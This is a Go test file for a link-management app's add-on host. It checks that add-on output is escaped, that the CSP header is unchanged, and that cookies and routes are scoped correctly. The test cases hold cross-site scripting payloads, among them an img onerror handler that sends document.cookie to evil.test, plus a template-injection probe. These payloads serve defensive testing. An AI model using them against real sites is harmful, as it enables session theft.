package httpx

import (
	"context"
	"net/http"
	"net/http/httptest"
	"strconv"
	"strings"
	"testing"

	"github.com/google/uuid"

	"github.com/DevOfPie/LinkCtrl/internal/addon"
	"github.com/DevOfPie/LinkCtrl/internal/auth"
	"github.com/DevOfPie/LinkCtrl/internal/config"
	"github.com/DevOfPie/LinkCtrl/internal/ui"
)

// The adversarial half of M64, and it is the milestone's load-bearing claim: an
// add-on's output is data. m64.md's first risk asks for hostile output from day
// one, so these tests hand the handler exactly what a malicious module would
// answer with and read the bytes that would reach a browser.
//
// A stub rather than a wasm module, deliberately. What is under test here is the
// host's rendering decision, and a stub can answer things a compiled fixture
// would have to be rewritten to answer — including responses no SDK would
// produce. The wasm path is exercised in internal/addon, against a real module.

// stubAddonRouter stands in for the add-on host.
type stubAddonRouter struct {
	resp addon.Response
	err  error
	// seen is the last request the router was handed, so a test can assert what
	// crossed as well as what came back.
	seen addon.RequestIn
	sess addon.SessionContext
	name string
}

func (s *stubAddonRouter) Route(_ context.Context, name string, in addon.RequestIn,
	sess addon.SessionContext) (addon.Response, error) {
	s.name, s.seen, s.sess = name, in, sess
	return s.resp, s.err
}

// A value receiver on the zero value, for maximalDeps: it needs something
// non-nil in the interface and never calls it.
type nopAddonRouter struct{}

func (nopAddonRouter) Route(context.Context, string, addon.RequestIn,
	addon.SessionContext) (addon.Response, error) {
	return addon.Response{}, addon.ErrNoRoute
}

// addonWeb is a Web wired for the add-on page and nothing else.
func addonWeb(t *testing.T, router AddonRouter) *Web {
	t.Helper()
	r, err := ui.New()
	if err != nil {
		t.Fatalf("ui.New: %v", err)
	}
	return &Web{UI: r, Addons: router}
}

// serveAddon runs one request through the handler, with the pattern's path
// values set the way ServeMux would set them.
func serveAddon(t *testing.T, web *Web, method, name, rest string) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest(method, addon.RoutePrefix+name+"/"+rest, nil)
	req.SetPathValue("addon", name)
	req.SetPathValue("rest", rest)
	rec := httptest.NewRecorder()
	web.AddonPage(rec, req)
	return rec
}

// Every shape of injection a module could try, and what the page must contain
// instead. The claim is not "the dangerous thing is stripped" — it is that the
// bytes arrive as text, which is why each case asserts the escaped form is
// present as well as asserting the raw form is absent.
func TestAnAddonsOutputIsTextAndNeverMarkup(t *testing.T) {
	cases := []struct {
		name    string
		body    string
		absent  []string
		present string
	}{
		{
			name: "script tag",
			body: `<script>alert(document.cookie)</script>`,
			// The injected tag itself, not a bare "</script>": the layout ships two
			// script elements of its own, and escaping is about the angle brackets
			// around a name rather than about the name — `alert(` as text in a
			// paragraph is inert, and `<script>alert(` is not.
			absent:  []string{"<script>alert("},
			present: "&lt;script&gt;alert(document.cookie)&lt;/script&gt;",
		},
		{
			name: "inline handler",
			body: `<img src=x onerror="fetch('//evil.test/'+document.cookie)">`,
			// `<img`, and deliberately not `onerror=`: the escaped form leaves the
			// characters o-n-e-r-r-o-r as text, which is exactly what inertness looks
			// like. What must not exist is a tag for an attribute to sit in.
			absent:  []string{"<img"},
			present: "&lt;img src=x onerror=",
		},
		{
			name: "external reference",
			body: `<script src="https://evil.test/x.js"></script>`,
			// Not a bare "<script": the layout ships two script tags of its own,
			// and a test that could not tell them from the add-on's would be
			// asserting that the dashboard has no JavaScript.
			absent:  []string{`<script src="https://evil.test`, `src="https://evil.test/x.js"`},
			present: "&lt;script src=&#34;https://evil.test/x.js&#34;&gt;",
		},
		{
			// Breaking out of the container the page puts it in, which is what an
			// escaping bug would look like from the outside.
			name:    "closing the container",
			body:    `</div></section></main><script>1</script>`,
			absent:  []string{"</main><script>"},
			present: "&lt;/div&gt;&lt;/section&gt;&lt;/main&gt;",
		},
		{
			// The classic template-injection probe. It must not be evaluated, which
			// it cannot be: the body is a value, not a template.
			name:    "template syntax",
			body:    `{{.Identity}} {{template "layout" .}}`,
			absent:  []string{"identity_menu"},
			present: `{{.Identity}} {{template &#34;layout&#34; .}}`,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			web := addonWeb(t, &stubAddonRouter{resp: addon.Response{
				Status: http.StatusOK, Body: tc.body,
			}})
			rec := serveAddon(t, web, http.MethodGet, "probe", "page")
			if rec.Code != http.StatusOK {
				t.Fatalf("status %d, want 200", rec.Code)
			}
			body := rec.Body.String()
			for _, forbidden := range tc.absent {
				if strings.Contains(body, forbidden) {
					t.Errorf("the page carries %q verbatim: an add-on's output reached the "+
						"document as markup, and the whole of M64's security claim is that it "+
						"cannot", forbidden)
				}
			}
			if !strings.Contains(body, tc.present) {
				t.Errorf("the page does not carry the escaped form %q; what it has is:\n%s",
					tc.present, body)
			}
			if !strings.Contains(body, "<!doctype html>") {
				t.Error("the add-on's answer did not go through the host's layout")
			}
		})
	}
}

// policyBeforeM64 is the Content-Security-Policy as it stood before this
// milestone, written out.
//
// A literal, and that is the point: comparing the header against the `csp`
// constant would agree with whatever the constant says, which is not the claim.
// m64.md's claim is that the constant did not *move*, and only a copy taken from
// before it could have moved can say so. It is allowed to differ from the
// constant exactly once — deliberately, with an argument, which is what the
// inherited `ui` rule means — and then this line is what makes that argument
// visible in a diff.
const policyBeforeM64 = "default-src 'self'; script-src 'self'; style-src 'self'; " +
	"img-src 'self' data:; font-src 'self'; connect-src 'self'; " +
	"object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'none'"

// The inherited rule, asserted where it would break: the policy is the same
// string on an add-on's page as on every other page, and the same string it was
// before add-ons could draw one.
func TestTheCSPIsUnchangedOnAnAddonPage(t *testing.T) {
	web := addonWeb(t, &stubAddonRouter{resp: addon.Response{Body: "hello"}})
	handler := SecurityHeaders(config.Config{})(http.HandlerFunc(web.AddonPage))

	req := httptest.NewRequest(http.MethodGet, addon.RoutePrefix+"probe/page", nil)
	req.SetPathValue("addon", "probe")
	req.SetPathValue("rest", "page")
	rec := httptest.NewRecorder()
	handler.ServeHTTP(rec, req)

	if got := rec.Header().Get("Content-Security-Policy"); got != policyBeforeM64 {
		t.Errorf("the policy an add-on's page is served under is\n%q\nand before M64 it was\n%q\n"+
			"M64 renders an add-on's output as data precisely so that this string does not "+
			"have to change", got, policyBeforeM64)
	}
	if csp != policyBeforeM64 {
		t.Errorf("the csp constant is\n%q\nand M64 inherited\n%q", csp, policyBeforeM64)
	}
	if strings.Contains(csp, "unsafe") {
		t.Error("the policy carries an unsafe- directive; M64 was not allowed to add one")
	}
}

// A module that answers with a media type of its own gets it, from the closed
// vocabulary the host enforces at the moment the response is written. What
// matters here is that the bytes are not wrapped and not escaped — and that the
// type is one a browser does not execute.
func TestAnAddonMayAnswerTextOrJSON(t *testing.T) {
	for _, tc := range []struct{ contentType, body string }{
		{"text/plain; charset=utf-8", "<not markup>"},
		{"application/json", `{"ok":true}`},
	} {
		t.Run(tc.contentType, func(t *testing.T) {
			web := addonWeb(t, &stubAddonRouter{resp: addon.Response{
				Status: http.StatusOK, ContentType: tc.contentType, Body: tc.body,
			}})
			rec := serveAddon(t, web, http.MethodGet, "probe", "api")
			if got := rec.Header().Get("Content-Type"); got != tc.contentType {
				t.Errorf("Content-Type = %q, want %q", got, tc.contentType)
			}
			if rec.Body.String() != tc.body {
				t.Errorf("body = %q, want %q", rec.Body.String(), tc.body)
			}
			if got := rec.Header().Get("Cache-Control"); got != "no-store" {
				t.Errorf("Cache-Control = %q; an add-on's answer is personal", got)
			}
		})
	}
}

// A redirect is 302 and carries no-store. The permanent forms are refused before
// they reach here — internal/addon checks the record — so what this asserts is
// that the host writes the status rather than passing one through.
func TestAnAddonsRedirectIsFound(t *testing.T) {
	web := addonWeb(t, &stubAddonRouter{resp: addon.Response{
		Status: http.StatusFound, Location: "https://idp.test/authorize?x=1",
	}})
	rec := serveAddon(t, web, http.MethodGet, "probe", "start")
	if rec.Code != http.StatusFound {
		t.Errorf("status %d, want 302 — this product never answers a permanent redirect", rec.Code)
	}
	if got := rec.Header().Get("Location"); got != "https://idp.test/authorize?x=1" {
		t.Errorf("Location = %q", got)
	}
}

// The cookie an add-on's response writes is scoped by the host: to the add-on's
// own path, with the host's own attributes. A module cannot opt out of HttpOnly,
// and cannot widen the path to the origin.
//
// What it writes is the *jar* — internal/addon packs a module's own cookies into
// it and empties the list they came from (F289) — so the name here is the host's
// and the value is opaque. The attributes are what this file has always been
// about, and they did not change.
func TestTheHostScopesTheJarItWritesForAnAddon(t *testing.T) {
	web := addonWeb(t, &stubAddonRouter{resp: addon.Response{
		Body: "ok",
		Jar:  []addon.JarCookie{{Name: "linkctrl_addon_probe_kept", Value: "packed", MaxAge: 300}},
	}})
	web.Config.SecureCookies = true
	rec := serveAddon(t, web, http.MethodGet, "probe", "start")

	set := rec.Header().Get("Set-Cookie")
	for _, want := range []string{
		"linkctrl_addon_probe_kept=packed", "Path=/addons/probe/", "HttpOnly", "Secure",
		"SameSite=Lax", "Max-Age=300",
	} {
		if !strings.Contains(set, want) {
			t.Errorf("Set-Cookie %q is missing %q", set, want)
		}
	}
}

// The structural half of F289, asserted where the header is written rather than
// where the jar is packed.
//
// A response arrives here carrying twelve hundred cookies a module named — the
// flood that evicted `linkctrl_session` in Chromium at n=180 — and *nothing* is
// written, because this writer has no path to a module's own list at all. That
// is the property the fix rests on: not that some bound was applied upstream,
// but that a caller here cannot write an add-on's cookies even by trying, so a
// later milestone adding a second writer cannot reintroduce the flood by
// forgetting a check it never had to know about.
func TestTheWriterCannotWriteACookieAModuleNamed(t *testing.T) {
	flood := make([]addon.Cookie, 1200)
	for i := range flood {
		flood[i] = addon.Cookie{Name: "probe_flood_" + strconv.Itoa(i), Value: "x", MaxAge: 31536000}
	}
	web := addonWeb(t, &stubAddonRouter{resp: addon.Response{Body: "ok", SetCookie: flood}})
	rec := serveAddon(t, web, http.MethodGet, "probe", "start")

	if got := rec.Header()["Set-Cookie"]; len(got) != 0 {
		t.Errorf("%d Set-Cookie headers reached the browser from a module's own list; "+
			"the first is %q", len(got), got[0])
	}
	if rec.Code != http.StatusOK {
		t.Errorf("status %d: the page itself still answers", rec.Code)
	}
}

// The page is reachable with no session at all, which is D261 and is what makes
// M65's hook implementable on this surface. The record says so honestly rather
// than by omission: `signed_in` is false.
func TestAnAddonPageIsReachableWithoutASession(t *testing.T) {
	stub := &stubAddonRouter{resp: addon.Response{Body: "sign in"}}
	web := addonWeb(t, stub)
	rec := serveAddon(t, web, http.MethodGet, "probe", "start")
	if rec.Code != http.StatusOK {
		t.Fatalf("status %d: an anonymous visitor could not reach an add-on's page, so no "+
			"add-on can begin a sign-in", rec.Code)
	}
	if stub.sess.SignedIn {
		t.Error("the session context says somebody is signed in and nobody is")
	}
	if stub.sess.UserID != "" || stub.sess.Email != "" {
		t.Errorf("an anonymous request carried an identity: %+v", stub.sess)
	}
}

// And with one, the identity crosses — and nothing else does. The absences are
// the assertion: no cookie, no token, no session identifier, which is what the
// SessionContext record promises at the ABI's surface.
func TestASignedInVisitorsIdentityCrossesAndNothingElseDoes(t *testing.T) {
	stub := &stubAddonRouter{resp: addon.Response{Body: "hello"}}
	web := addonWeb(t, stub)

	id := &auth.Identity{
		UserID:      mustUUID("0198c9c5-0000-7000-8000-000000000001"),
		Email:       "owner@example.com",
		Name:        "Owner",
		WorkspaceID: mustUUID("0198c9c5-0000-7000-8000-000000000002"),
		OrgID:       mustUUID("0198c9c5-0000-7000-8000-000000000003"),
		SessionID:   mustUUID("0198c9c5-0000-7000-8000-0000000000ff"),
		Role:        "owner",
	}
	req := httptest.NewRequest(http.MethodGet, addon.RoutePrefix+"probe/page", nil)
	req.SetPathValue("addon", "probe")
	req.SetPathValue("rest", "page")
	req.AddCookie(&http.Cookie{Name: auth.CookieName(false), Value: "a-real-looking-token"})
	req = req.WithContext(context.WithValue(req.Context(), ctxIdentity, id))
	rec := httptest.NewRecorder()
	web.AddonPage(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("status %d", rec.Code)
	}
	if !stub.sess.SignedIn || stub.sess.UserID != id.UserID.String() {
		t.Errorf("the session context did not carry the identity: %+v", stub.sess)
	}
	if stub.sess.OrganizationID != id.OrgID.String() || stub.sess.WorkspaceID != id.WorkspaceID.String() {
		t.Errorf("the session context did not carry where the request landed: %+v", stub.sess)
	}
	// The session id is the one field of an Identity that names the credential
	// rather than the person, and no field of the record can carry it.
	if strings.Contains(fmtSess(stub.sess), id.SessionID.String()) {
		t.Error("the session identifier crossed the boundary")
	}
}

// The three failures a routing call can produce, each mapped to the status an
// operator and a visitor can act on.
func TestARoutingFailureAnswersWhatItMeans(t *testing.T) {
	for _, tc := range []struct {
		err  error
		want int
	}{
		{addon.ErrNoRoute, http.StatusNotFound},
		{addon.ErrBusy, http.StatusServiceUnavailable},
		// The one failure the *client* caused, so the one that is not a 5xx: the
		// record built from the body somebody sent does not fit one ABI value.
		{addon.ErrRequestTooLarge, http.StatusRequestEntityTooLarge},
		{addon.ErrNoHandler, http.StatusBadGateway},
		{addon.ErrNoResponse, http.StatusBadGateway},
		{addon.ErrGuestFailed, http.StatusBadGateway},
	} {
		t.Run(tc.err.Error(), func(t *testing.T) {
			web := addonWeb(t, &stubAddonRouter{err: tc.err})
			rec := serveAddon(t, web, http.MethodGet, "probe", "page")
			if rec.Code != tc.want {
				t.Errorf("%v answered %d, want %d", tc.err, rec.Code, tc.want)
			}
			// Nothing the guest said reaches the reader.
			if strings.Contains(rec.Body.String(), tc.err.Error()) {
				t.Error("the failure's own text reached the page")
			}
		})
	}
}

// The prefix is on the application tree and nowhere else, which is the redirect
// tree's minimality rule applied to this milestone. Read off the registration
// pass rather than off a list: the mount is what the root tree would route.
func TestTheAddonPrefixIsOnTheApplicationTreeOnly(t *testing.T) {
	app := newAppMux()
	registerAppRoutes(maximalDeps(), app)

	var mounted bool
	for _, m := range app.mounts() {
		if m == addon.RoutePrefix {
			mounted = true
		}
	}
	if !mounted {
		t.Fatalf("%q is not among the application mounts: %v", addon.RoutePrefix, app.mounts())
	}
	if !isReserved("addons") {
		t.Error("the addons prefix is not in internal/alias/reserved.txt, so a user could " +
			"create an alias that shadows every add-on's pages")
	}

	// The link tree is built from registerRedirect and the ops endpoints, neither
	// of which can carry an application pattern — so the falsifiable form is that
	// an add-on route is not among the patterns a *link* host serves. NewRouter
	// with SplitHosts is what proves it end to end, and that is
	// TestAnAddonRouteIsNotOnTheLinkHost below.
}

// The other half of m64.md's first bullet, and the half the test above could
// only assert about a list: an add-on route registered on the link host 404s.
//
// Driven through NewRouter with SplitHosts, because that is the only place the
// two trees exist as separate muxes, and driven as a real request carrying a Host
// header, because that is what a reverse proxy in front of one listener sends. A
// pattern list would not do: the claim is about which tree answers, and both
// trees are assembled inside NewRouter from registrations neither list can see.
func TestAnAddonRouteIsNotOnTheLinkHost(t *testing.T) {
	const (
		appHost  = "manage.addons.test"
		linkHost = "go.addons.test"
	)
	// A real Config through Parse, for the reason the split-host integration
	// fixture uses one: the split is decided by unexported parsed origins, so a
	// hand-built struct cannot turn it on and a test cannot half-enable it.
	for k, v := range map[string]string{
		"LINKCTRL_APP_ENV":        "development",
		"LINKCTRL_BASE_URL":       "http://" + appHost,
		"LINKCTRL_APP_BASE_URL":   "http://" + appHost,
		"LINKCTRL_LINK_BASE_URL":  "http://" + linkHost,
		"LINKCTRL_API_KEY_PEPPER": strings.Repeat("p", 48),
		"LINKCTRL_DATABASE_URL":   "postgres://u:p@127.0.0.1:5432/linkctrl?sslmode=disable",
		"LINKCTRL_SECURE_COOKIES": "false",
	} {
		t.Setenv(k, v)
	}
	cfg, err := config.Parse()
	if err != nil {
		t.Fatalf("parse a split-host configuration: %v", err)
	}
	if !cfg.SplitHosts() {
		t.Fatal("the configuration did not register as split-host, so the rest of this " +
			"test would be asserting about one mux twice")
	}

	stub := &stubAddonRouter{resp: addon.Response{Body: "the module answered"}}
	web := addonWeb(t, stub)
	web.Config = cfg
	handler := NewRouter(Deps{
		Config: cfg,
		Web:    web,
		// A route of the link tree's own, so that a 404 below is a route this
		// milestone did not put there rather than a tree nothing was put in.
		Health: &Health{},
	})
	path := addon.RoutePrefix + "probe/json"

	// The dashboard host: the pattern is live and the module is what answers.
	rec := httptest.NewRecorder()
	handler.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "http://"+appHost+path, nil))
	if rec.Code != http.StatusOK {
		t.Fatalf("the dashboard host answered %d for %q, so this test cannot tell an "+
			"absent route from a broken one", rec.Code, path)
	}
	if stub.name != "probe" {
		t.Fatalf("the dashboard host did not route to an add-on: the host was asked for %q", stub.name)
	}

	// The link host: the same path, and nothing of this milestone's is there.
	stub.name = ""
	rec = httptest.NewRecorder()
	handler.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "http://"+linkHost+path, nil))
	if rec.Code != http.StatusNotFound {
		t.Errorf("the link host answered %d for %q, want 404: an add-on route on the "+
			"redirect tree is a session lookup and a template render on the path whose "+
			"whole rule is that it has neither", rec.Code, path)
	}
	if stub.name != "" {
		t.Errorf("the link host routed a request into add-on %q", stub.name)
	}
	if strings.Contains(rec.Body.String(), "the module answered") {
		t.Error("the link host served an add-on's body")
	}

	// And the link tree was built, so the 404 above is an absence rather than an
	// empty mux agreeing with whatever it is asked.
	rec = httptest.NewRecorder()
	handler.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "http://"+linkHost+"/healthz", nil))
	if rec.Code != http.StatusOK {
		t.Fatalf("the link host answered %d for /healthz, so it 404s everything and the "+
			"assertion above proves nothing", rec.Code)
	}
}

// With no add-on host, no route exists at all — m60.md's "no route is mounted",
// still true for every operator who installs nothing.
func TestNoAddonRouteWithoutAHost(t *testing.T) {
	d := maximalDeps()
	d.Web.Addons = nil
	app := newAppMux()
	registerAppRoutes(d, app)
	for _, p := range app.patterns {
		if strings.Contains(p, addon.RoutePrefix) {
			t.Errorf("an instance with no add-on host registered %q", p)
		}
	}
}

// mustUUID is a literal identifier, parsed. A test that built one by hand would
// be asserting about a value no session ever carries.
func mustUUID(s string) uuid.UUID { return uuid.MustParse(s) }

func fmtSess(s addon.SessionContext) string {
	return strings.Join([]string{
		s.UserID, s.Email, s.DisplayName, s.WorkspaceID, s.OrganizationID, s.Role,
	}, " ")
}
